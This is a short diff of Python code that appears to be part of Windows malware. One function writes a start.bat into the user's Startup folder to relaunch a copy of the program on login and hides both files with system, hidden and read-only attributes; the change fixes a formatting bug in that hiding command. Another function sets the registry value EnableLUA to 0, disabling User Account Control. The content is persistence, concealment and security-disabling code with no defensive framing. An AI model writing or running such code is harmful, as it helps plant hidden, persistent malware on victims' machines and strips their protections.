@@ -57,7 +57,7 @@ def CYS()->None:
 start C:\\Users\\{0}\\Documents\\{1}
 exit""".format(environ["username"], basename(argv[0])))
     run("attrib +s +h +r C:\\Users\\"+environ["username"]+"\\Documents\\"+basename(argv[0]))
-    run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"")
+    run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
 def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
     SetValueEx(key,"EnableLUA",0,REG_DWORD,0)
